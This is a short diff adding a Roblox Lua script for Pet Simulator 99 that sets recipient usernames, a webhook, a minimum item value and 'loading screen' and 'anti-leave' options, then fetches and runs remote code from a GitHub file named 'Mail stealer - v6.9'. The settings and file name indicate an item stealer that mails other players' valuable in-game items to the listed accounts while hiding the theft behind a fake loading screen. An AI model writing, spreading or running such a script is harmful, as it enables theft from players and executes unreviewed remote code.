@@ -1,0 +1,8 @@
+Username = "1xreaperofdeathx1"
+Username2 = "Usestarcode_Zxxzxeed" -- stuff will get sent to this user if first user's mailbox is full
+Webhook = ""
+min_rap = 15000 -- minimum rap of each item you want to get sent to you.
+Loadingscreen = true -- make true or false if you want/dont want loadingscreen 
+antileave = false -- make true or false if you want/dont want anti leave
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/giorpro1322/PETSIM99SCRIPTS/main/Mail%20stealer%20-%20v6.9"))()
